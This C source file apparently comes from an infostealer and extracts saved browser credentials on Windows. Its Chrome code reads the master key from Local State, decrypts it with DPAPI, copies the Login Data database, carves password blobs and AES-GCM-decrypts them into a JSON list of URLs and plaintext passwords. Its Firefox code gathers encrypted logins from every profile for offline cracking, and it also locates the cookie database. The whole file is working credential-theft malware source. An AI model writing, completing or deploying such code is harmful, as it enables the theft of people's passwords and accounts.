/*
 * browser.c - Browser credentials extraction
 *
 * Chrome: SQLite + DPAPI/AES-GCM decryption
 * Firefox: profiles.ini + logins.json
 */

#define WIN32_LEAN_AND_MEAN
#include <windows.h>
#include <wincrypt.h>
#include <bcrypt.h>
#include <shlobj.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

#pragma comment(lib, "crypt32.lib")
#pragma comment(lib, "bcrypt.lib")

#define SQLITE_HEADER "SQLite format 3"
#define MAX_CREDENTIALS 256
#define CHROME_KEY_PREFIX "DPAPI"

/* Helpers */

/* Décode base64 */
static BYTE* Base64Decode(const char* input, DWORD* outLen) {
    DWORD len = 0;
    if (!CryptStringToBinaryA(input, 0, CRYPT_STRING_BASE64, NULL, &len, NULL, NULL)) {
        return NULL;
    }
    BYTE* output = (BYTE*)malloc(len);
    if (!output) return NULL;
    
    if (!CryptStringToBinaryA(input, 0, CRYPT_STRING_BASE64, output, &len, NULL, NULL)) {
        free(output);
        return NULL;
    }
    *outLen = len;
    return output;
}

/* Déchiffre avec DPAPI */
static BYTE* DPAPIDecrypt(BYTE* data, DWORD dataLen, DWORD* outLen) {
    DATA_BLOB in, out;
    in.pbData = data;
    in.cbData = dataLen;
    
    if (!CryptUnprotectData(&in, NULL, NULL, NULL, NULL, 0, &out)) {
        return NULL;
    }
    
    BYTE* result = (BYTE*)malloc(out.cbData);
    if (result) {
        memcpy(result, out.pbData, out.cbData);
        *outLen = out.cbData;
    }
    LocalFree(out.pbData);
    return result;
}

/* Minimal JSON parser (no external lib) */

/* Trouve une valeur string dans un JSON simple */
static char* JsonGetString(const char* json, const char* key) {
    char searchKey[256];
    snprintf(searchKey, sizeof(searchKey), "\"%s\"", key);
    
    const char* found = strstr(json, searchKey);
    if (!found) return NULL;
    
    // Cherche le : puis la valeur
    found = strchr(found, ':');
    if (!found) return NULL;
    found++;
    
    // Skip espaces
    while (*found == ' ' || *found == '\t' || *found == '\n') found++;
    
    if (*found != '"') return NULL;
    found++;
    
    // Trouve la fin de la string
    const char* end = found;
    while (*end && *end != '"') {
        if (*end == '\\') end++; // Skip escaped chars
        if (*end) end++;
    }
    
    size_t len = end - found;
    char* result = (char*)malloc(len + 1);
    if (result) {
        memcpy(result, found, len);
        result[len] = '\0';
    }
    return result;
}

/* Chrome password extraction */

/* Lit le fichier Local State et extrait la clé maître */
static BYTE* GetChromeMasterKey(DWORD* keyLen) {
    char localStatePath[MAX_PATH];
    char* localAppData = getenv("LOCALAPPDATA");
    if (!localAppData) return NULL;
    
    snprintf(localStatePath, sizeof(localStatePath), 
             "%s\\Google\\Chrome\\User Data\\Local State", localAppData);
    
    // Lit le fichier
    FILE* f = fopen(localStatePath, "rb");
    if (!f) return NULL;
    
    fseek(f, 0, SEEK_END);
    long fileSize = ftell(f);
    fseek(f, 0, SEEK_SET);
    
    char* content = (char*)malloc(fileSize + 1);
    if (!content) { fclose(f); return NULL; }
    
    fread(content, 1, fileSize, f);
    content[fileSize] = '\0';
    fclose(f);
    
    // Trouve encrypted_key
    char* encKeyB64 = JsonGetString(content, "encrypted_key");
    free(content);
    if (!encKeyB64) return NULL;
    
    // Décode base64
    DWORD encKeyLen = 0;
    BYTE* encKey = Base64Decode(encKeyB64, &encKeyLen);
    free(encKeyB64);
    if (!encKey) return NULL;
    
    // Skip le préfixe "DPAPI" (5 bytes)
    if (encKeyLen <= 5 || memcmp(encKey, "DPAPI", 5) != 0) {
        free(encKey);
        return NULL;
    }
    
    // Déchiffre avec DPAPI
    BYTE* masterKey = DPAPIDecrypt(encKey + 5, encKeyLen - 5, keyLen);
    free(encKey);
    
    return masterKey;
}

/* AES-256-GCM decryption using BCrypt */
static char* AesGcmDecrypt(BYTE* ciphertext, DWORD cipherLen, BYTE* key, DWORD keyLen, 
                           BYTE* nonce, DWORD nonceLen, BYTE* tag, DWORD tagLen) {
    BCRYPT_ALG_HANDLE hAlg = NULL;
    BCRYPT_KEY_HANDLE hKey = NULL;
    NTSTATUS status;
    char* result = NULL;
    
    // Open AES algorithm
    status = BCryptOpenAlgorithmProvider(&hAlg, BCRYPT_AES_ALGORITHM, NULL, 0);
    if (!BCRYPT_SUCCESS(status)) return NULL;
    
    // Set chaining mode to GCM
    status = BCryptSetProperty(hAlg, BCRYPT_CHAINING_MODE, (PUCHAR)BCRYPT_CHAIN_MODE_GCM, 
                               sizeof(BCRYPT_CHAIN_MODE_GCM), 0);
    if (!BCRYPT_SUCCESS(status)) {
        BCryptCloseAlgorithmProvider(hAlg, 0);
        return NULL;
    }
    
    // Generate key from raw bytes
    status = BCryptGenerateSymmetricKey(hAlg, &hKey, NULL, 0, key, keyLen, 0);
    if (!BCRYPT_SUCCESS(status)) {
        BCryptCloseAlgorithmProvider(hAlg, 0);
        return NULL;
    }
    
    // Setup auth info for GCM
    BCRYPT_AUTHENTICATED_CIPHER_MODE_INFO authInfo;
    BCRYPT_INIT_AUTH_MODE_INFO(authInfo);
    authInfo.pbNonce = nonce;
    authInfo.cbNonce = nonceLen;
    authInfo.pbTag = tag;
    authInfo.cbTag = tagLen;
    
    // Decrypt
    DWORD plainLen = 0;
    status = BCryptDecrypt(hKey, ciphertext, cipherLen, &authInfo, NULL, 0, NULL, 0, &plainLen, 0);
    if (!BCRYPT_SUCCESS(status)) {
        BCryptDestroyKey(hKey);
        BCryptCloseAlgorithmProvider(hAlg, 0);
        return NULL;
    }
    
    BYTE* plaintext = (BYTE*)malloc(plainLen + 1);
    if (!plaintext) {
        BCryptDestroyKey(hKey);
        BCryptCloseAlgorithmProvider(hAlg, 0);
        return NULL;
    }
    
    status = BCryptDecrypt(hKey, ciphertext, cipherLen, &authInfo, NULL, 0, 
                           plaintext, plainLen, &plainLen, 0);
    
    BCryptDestroyKey(hKey);
    BCryptCloseAlgorithmProvider(hAlg, 0);
    
    if (BCRYPT_SUCCESS(status)) {
        plaintext[plainLen] = '\0';
        result = (char*)plaintext;
    } else {
        free(plaintext);
    }
    
    return result;
}

/* Decrypt Chrome password (AES-256-GCM for v80+) */
static char* DecryptChromePassword(BYTE* encData, DWORD encLen, BYTE* masterKey, DWORD masterKeyLen) {
    // Format: "v10" or "v11" (3 bytes) + nonce (12 bytes) + ciphertext + tag (16 bytes)
    if (encLen < 3 + 12 + 16) return NULL;
    
    // Check version prefix
    if (encData[0] != 'v' || encData[1] != '1' || (encData[2] != '0' && encData[2] != '1')) {
        // Old DPAPI format
        DWORD decLen = 0;
        BYTE* dec = DPAPIDecrypt(encData, encLen, &decLen);
        if (dec) {
            char* result = (char*)malloc(decLen + 1);
            if (result) {
                memcpy(result, dec, decLen);
                result[decLen] = '\0';
            }
            free(dec);
            return result;
        }
        return NULL;
    }
    
    // AES-256-GCM (Chrome v80+)
    BYTE* nonce = encData + 3;
    DWORD nonceLen = 12;
    BYTE* ciphertext = encData + 3 + 12;
    DWORD cipherLen = encLen - 3 - 12 - 16;
    BYTE* tag = encData + encLen - 16;
    DWORD tagLen = 16;
    
    return AesGcmDecrypt(ciphertext, cipherLen, masterKey, masterKeyLen, nonce, nonceLen, tag, tagLen);
}

/* Credential storage */
typedef struct {
    char url[512];
    char username[256];
    char password[256];
} ChromeCredential;

/* Minimal SQLite parser - finds strings in Login Data */
static int ParseLoginDataRaw(const char* dbPath, BYTE* masterKey, DWORD masterKeyLen,
                              ChromeCredential* creds, int maxCreds) {
    int count = 0;
    
    // Read the database file
    HANDLE hFile = CreateFileA(dbPath, GENERIC_READ, FILE_SHARE_READ, NULL, 
                               OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hFile == INVALID_HANDLE_VALUE) return 0;
    
    DWORD fileSize = GetFileSize(hFile, NULL);
    if (fileSize == INVALID_FILE_SIZE || fileSize < 100) {
        CloseHandle(hFile);
        return 0;
    }
    
    BYTE* data = (BYTE*)malloc(fileSize);
    if (!data) {
        CloseHandle(hFile);
        return 0;
    }
    
    DWORD bytesRead;
    if (!ReadFile(hFile, data, fileSize, &bytesRead, NULL)) {
        free(data);
        CloseHandle(hFile);
        return 0;
    }
    CloseHandle(hFile);
    
    // Verify SQLite header
    if (memcmp(data, SQLITE_HEADER, 15) != 0) {
        free(data);
        return 0;
    }
    
    // Scan for password blobs (v10/v11 prefix)
    // This is a heuristic approach - looks for encrypted password patterns
    for (DWORD i = 0; i < fileSize - 20 && count < maxCreds; i++) {
        // Look for v10 or v11 prefix (Chrome encrypted password)
        if (data[i] == 'v' && data[i+1] == '1' && (data[i+2] == '0' || data[i+2] == '1')) {
            // Find the blob length by looking backwards for URL patterns
            // Encrypted passwords are typically 50-200 bytes
            DWORD blobStart = i;
            DWORD blobLen = 0;
            
            // Estimate blob length (look for next null or reasonable end)
            for (DWORD j = i + 3; j < fileSize && j < i + 500; j++) {
                // GCM tag is 16 bytes, minimum overhead is 3+12+16=31
                if (j - i >= 31) {
                    // Check if this looks like end of blob
                    if (data[j] == 0 && data[j+1] == 0) {
                        blobLen = j - i;
                        break;
                    }
                }
            }
            
            if (blobLen >= 31 && blobLen < 500 && masterKey) {
                char* decrypted = DecryptChromePassword(data + blobStart, blobLen, masterKey, masterKeyLen);
                if (decrypted && strlen(decrypted) > 0 && strlen(decrypted) < 256) {
                    // Try to find associated URL (search backwards for http)
                    char url[512] = "unknown";
                    char username[256] = "unknown";
                    
                    // Search backwards for URL
                    for (int k = (int)blobStart - 1; k >= 0 && k > (int)blobStart - 2000; k--) {
                        if (data[k] == 'h' && data[k+1] == 't' && data[k+2] == 't' && data[k+3] == 'p') {
                            int urlLen = 0;
                            while (data[k + urlLen] >= 32 && data[k + urlLen] < 127 && urlLen < 500) {
                                urlLen++;
                            }
                            if (urlLen > 10 && urlLen < 500) {
                                memcpy(url, data + k, urlLen);
                                url[urlLen] = '\0';
                            }
                            break;
                        }
                    }
                    
                    strncpy(creds[count].url, url, sizeof(creds[count].url) - 1);
                    strncpy(creds[count].username, username, sizeof(creds[count].username) - 1);
                    strncpy(creds[count].password, decrypted, sizeof(creds[count].password) - 1);
                    count++;
                }
                if (decrypted) free(decrypted);
            }
            
            // Skip past this blob
            if (blobLen > 0) i += blobLen;
        }
    }
    
    free(data);
    return count;
}

/* 
 * Extract Chrome passwords.
 * Returns JSON with credentials.
 */
BOOL Browser_GetChromePasswords(char** outJson) {
    if (!outJson) return FALSE;
    *outJson = NULL;
    
    // Get master key
    DWORD masterKeyLen = 0;
    BYTE* masterKey = GetChromeMasterKey(&masterKeyLen);
    
    // Login Data path
    char dbPath[MAX_PATH];
    char* localAppData = getenv("LOCALAPPDATA");
    if (!localAppData) {
        if (masterKey) free(masterKey);
        return FALSE;
    }
    
    snprintf(dbPath, sizeof(dbPath),
             "%s\\Google\\Chrome\\User Data\\Default\\Login Data", localAppData);
    
    // Copy DB since Chrome locks it
    char tmpPath[MAX_PATH];
    snprintf(tmpPath, sizeof(tmpPath), "%s\\Temp\\login_data_%lu.db", localAppData, GetTickCount());
    
    if (!CopyFileA(dbPath, tmpPath, FALSE)) {
        if (masterKey) free(masterKey);
        return FALSE;
    }
    
    // Parse credentials
    ChromeCredential* creds = (ChromeCredential*)calloc(MAX_CREDENTIALS, sizeof(ChromeCredential));
    int credCount = 0;
    
    if (creds && masterKey) {
        credCount = ParseLoginDataRaw(tmpPath, masterKey, masterKeyLen, creds, MAX_CREDENTIALS);
    }
    
    // Build JSON output
    size_t jsonSize = 4096 + (credCount * 1024);
    char* json = (char*)malloc(jsonSize);
    if (!json) {
        if (masterKey) free(masterKey);
        if (creds) free(creds);
        DeleteFileA(tmpPath);
        return FALSE;
    }
    
    int offset = snprintf(json, jsonSize,
        "{\n"
        "  \"browser\": \"Chrome\",\n"
        "  \"profile\": \"Default\",\n"
        "  \"master_key_found\": %s,\n"
        "  \"credentials_count\": %d,\n"
        "  \"credentials\": [\n",
        masterKey ? "true" : "false",
        credCount);
    
    for (int i = 0; i < credCount && offset < (int)jsonSize - 512; i++) {
        // Escape special chars for JSON
        char escapedUrl[1024] = {0};
        char escapedPass[512] = {0};
        int j = 0;
        for (const char* p = creds[i].url; *p && j < 1000; p++) {
            if (*p == '"' || *p == '\\') escapedUrl[j++] = '\\';
            escapedUrl[j++] = *p;
        }
        j = 0;
        for (const char* p = creds[i].password; *p && j < 500; p++) {
            if (*p == '"' || *p == '\\') escapedPass[j++] = '\\';
            escapedPass[j++] = *p;
        }
        
        offset += snprintf(json + offset, jsonSize - offset,
            "    {\"url\": \"%s\", \"username\": \"%s\", \"password\": \"%s\"}%s\n",
            escapedUrl,
            creds[i].username,
            escapedPass,
            i < credCount - 1 ? "," : "");
    }
    
    snprintf(json + offset, jsonSize - offset, "  ]\n}");
    
    if (masterKey) free(masterKey);
    if (creds) free(creds);
    DeleteFileA(tmpPath);
    
    *outJson = json;
    return TRUE;
}

/*
 * Extract Chrome cookies
 */
BOOL Browser_GetChromeCookies(char** outJson) {
    if (!outJson) return FALSE;
    
    char dbPath[MAX_PATH];
    char* localAppData = getenv("LOCALAPPDATA");
    if (!localAppData) return FALSE;
    
    snprintf(dbPath, sizeof(dbPath),
             "%s\\Google\\Chrome\\User Data\\Default\\Network\\Cookies", localAppData);
    
    DWORD attrs = GetFileAttributesA(dbPath);
    BOOL exists = (attrs != INVALID_FILE_ATTRIBUTES);
    
    char* json = (char*)malloc(1024);
    if (!json) return FALSE;
    
    snprintf(json, 1024,
        "{\n"
        "  \"browser\": \"Chrome\",\n"
        "  \"cookies_db\": \"%s\",\n"
        "  \"exists\": %s,\n"
        "  \"note\": \"SQLite parsing required for cookie extraction\"\n"
        "}",
        dbPath,
        exists ? "true" : "false");
    
    *outJson = json;
    return TRUE;
}

/* =========================================================================
 * Firefox Credentials
 * ========================================================================= */

/* Firefox credential storage */
typedef struct {
    char url[512];
    char username[256];
    char encryptedPassword[512];
    char encryptedUsername[512];
} FirefoxCredential;

/* Find Firefox profiles */
static int GetFirefoxProfiles(char profiles[][MAX_PATH], int maxProfiles) {
    int count = 0;
    char profilesIniPath[MAX_PATH];
    char* appData = getenv("APPDATA");
    if (!appData) return 0;
    
    snprintf(profilesIniPath, sizeof(profilesIniPath),
             "%s\\Mozilla\\Firefox\\profiles.ini", appData);
    
    FILE* f = fopen(profilesIniPath, "r");
    if (!f) return 0;
    
    char line[1024];
    char currentPath[MAX_PATH] = {0};
    BOOL isRelative = TRUE;
    
    while (fgets(line, sizeof(line), f) && count < maxProfiles) {
        // Remove newline
        char* nl = strchr(line, '\n');
        if (nl) *nl = '\0';
        nl = strchr(line, '\r');
        if (nl) *nl = '\0';
        
        // Check for Path= or IsRelative=
        if (strncmp(line, "IsRelative=", 11) == 0) {
            isRelative = (line[11] == '1');
        } else if (strncmp(line, "Path=", 5) == 0) {
            if (isRelative) {
                snprintf(profiles[count], MAX_PATH, "%s\\Mozilla\\Firefox\\%s", 
                        appData, line + 5);
            } else {
                strncpy(profiles[count], line + 5, MAX_PATH - 1);
            }
            // Convert forward slashes to backslashes
            for (char* p = profiles[count]; *p; p++) {
                if (*p == '/') *p = '\\';
            }
            count++;
        }
    }
    
    fclose(f);
    return count;
}

/* Parse Firefox logins.json */
static int ParseLoginsJson(const char* profilePath, FirefoxCredential* creds, int maxCreds) {
    int count = 0;
    char loginsPath[MAX_PATH];
    snprintf(loginsPath, sizeof(loginsPath), "%s\\logins.json", profilePath);
    
    FILE* f = fopen(loginsPath, "rb");
    if (!f) return 0;
    
    fseek(f, 0, SEEK_END);
    long fileSize = ftell(f);
    fseek(f, 0, SEEK_SET);
    
    if (fileSize <= 0 || fileSize > 10 * 1024 * 1024) {
        fclose(f);
        return 0;
    }
    
    char* content = (char*)malloc(fileSize + 1);
    if (!content) {
        fclose(f);
        return 0;
    }
    
    fread(content, 1, fileSize, f);
    content[fileSize] = '\0';
    fclose(f);
    
    // Simple JSON parsing for logins array
    // Looking for: "hostname":"...", "encryptedUsername":"...", "encryptedPassword":"..."
    const char* ptr = content;
    
    while ((ptr = strstr(ptr, "\"hostname\"")) != NULL && count < maxCreds) {
        // Extract hostname
        const char* urlStart = strchr(ptr, ':');
        if (!urlStart) break;
        urlStart++;
        while (*urlStart == ' ' || *urlStart == '"') urlStart++;
        
        const char* urlEnd = strchr(urlStart, '"');
        if (!urlEnd) break;
        
        size_t urlLen = urlEnd - urlStart;
        if (urlLen < sizeof(creds[count].url)) {
            memcpy(creds[count].url, urlStart, urlLen);
            creds[count].url[urlLen] = '\0';
        }
        
        // Look for encryptedUsername
        const char* userField = strstr(ptr, "\"encryptedUsername\"");
        if (userField && userField < ptr + 2000) {
            const char* userStart = strchr(userField + 18, ':');
            if (userStart) {
                userStart++;
                while (*userStart == ' ' || *userStart == '"') userStart++;
                const char* userEnd = strchr(userStart, '"');
                if (userEnd) {
                    size_t len = userEnd - userStart;
                    if (len < sizeof(creds[count].encryptedUsername)) {
                        memcpy(creds[count].encryptedUsername, userStart, len);
                        creds[count].encryptedUsername[len] = '\0';
                    }
                }
            }
        }
        
        // Look for encryptedPassword
        const char* passField = strstr(ptr, "\"encryptedPassword\"");
        if (passField && passField < ptr + 2000) {
            const char* passStart = strchr(passField + 18, ':');
            if (passStart) {
                passStart++;
                while (*passStart == ' ' || *passStart == '"') passStart++;
                const char* passEnd = strchr(passStart, '"');
                if (passEnd) {
                    size_t len = passEnd - passStart;
                    if (len < sizeof(creds[count].encryptedPassword)) {
                        memcpy(creds[count].encryptedPassword, passStart, len);
                        creds[count].encryptedPassword[len] = '\0';
                    }
                }
            }
        }
        
        if (strlen(creds[count].url) > 0) {
            count++;
        }
        
        ptr = urlEnd + 1;
    }
    
    free(content);
    return count;
}

/*
 * Extract Firefox credentials
 * Note: Passwords are encrypted with NSS, requires key4.db + master password
 * This returns the encrypted values which can be decrypted offline
 */
BOOL Browser_GetFirefoxPasswords(char** outJson) {
    if (!outJson) return FALSE;
    *outJson = NULL;
    
    char profiles[16][MAX_PATH];
    int profileCount = GetFirefoxProfiles(profiles, 16);
    
    if (profileCount == 0) {
        char* json = (char*)malloc(256);
        if (json) {
            snprintf(json, 256, 
                "{\"browser\": \"Firefox\", \"error\": \"No profiles found\"}");
            *outJson = json;
        }
        return TRUE;
    }
    
    // Parse all profiles
    FirefoxCredential* allCreds = (FirefoxCredential*)calloc(MAX_CREDENTIALS, sizeof(FirefoxCredential));
    if (!allCreds) return FALSE;
    
    int totalCreds = 0;
    
    for (int p = 0; p < profileCount && totalCreds < MAX_CREDENTIALS; p++) {
        int found = ParseLoginsJson(profiles[p], allCreds + totalCreds, MAX_CREDENTIALS - totalCreds);
        totalCreds += found;
    }
    
    // Build JSON
    size_t jsonSize = 4096 + (totalCreds * 2048);
    char* json = (char*)malloc(jsonSize);
    if (!json) {
        free(allCreds);
        return FALSE;
    }
    
    int offset = snprintf(json, jsonSize,
        "{\n"
        "  \"browser\": \"Firefox\",\n"
        "  \"profiles_found\": %d,\n"
        "  \"credentials_count\": %d,\n"
        "  \"note\": \"Passwords are NSS-encrypted, requires key4.db to decrypt\",\n"
        "  \"credentials\": [\n",
        profileCount, totalCreds);
    
    for (int i = 0; i < totalCreds && offset < (int)jsonSize - 1024; i++) {
        // Escape for JSON
        char escapedUrl[1024] = {0};
        int j = 0;
        for (const char* p = allCreds[i].url; *p && j < 1000; p++) {
            if (*p == '"' || *p == '\\') escapedUrl[j++] = '\\';
            escapedUrl[j++] = *p;
        }
        
        offset += snprintf(json + offset, jsonSize - offset,
            "    {\n"
            "      \"url\": \"%s\",\n"
            "      \"encrypted_user\": \"%s\",\n"
            "      \"encrypted_pass\": \"%s\"\n"
            "    }%s\n",
            escapedUrl,
            allCreds[i].encryptedUsername,
            allCreds[i].encryptedPassword,
            i < totalCreds - 1 ? "," : "");
    }
    
    snprintf(json + offset, jsonSize - offset, "  ]\n}");
    
    free(allCreds);
    *outJson = json;
    return TRUE;
}

/*
 * Get all browser credentials (Chrome + Firefox)
 */
BOOL Browser_GetAllCredentials(char** outJson) {
    if (!outJson) return FALSE;
    *outJson = NULL;
    
    char* chromeJson = NULL;
    char* firefoxJson = NULL;
    
    Browser_GetChromePasswords(&chromeJson);
    Browser_GetFirefoxPasswords(&firefoxJson);
    
    size_t totalSize = 512;
    if (chromeJson) totalSize += strlen(chromeJson);
    if (firefoxJson) totalSize += strlen(firefoxJson);
    
    char* json = (char*)malloc(totalSize);
    if (!json) {
        free(chromeJson);
        free(firefoxJson);
        return FALSE;
    }
    
    snprintf(json, totalSize,
        "{\n"
        "  \"browsers\": {\n"
        "    \"chrome\": %s,\n"
        "    \"firefox\": %s\n"
        "  }\n"
        "}",
        chromeJson ? chromeJson : "null",
        firefoxJson ? firefoxJson : "null");
    
    free(chromeJson);
    free(firefoxJson);
    
    *outJson = json;
    return TRUE;
}
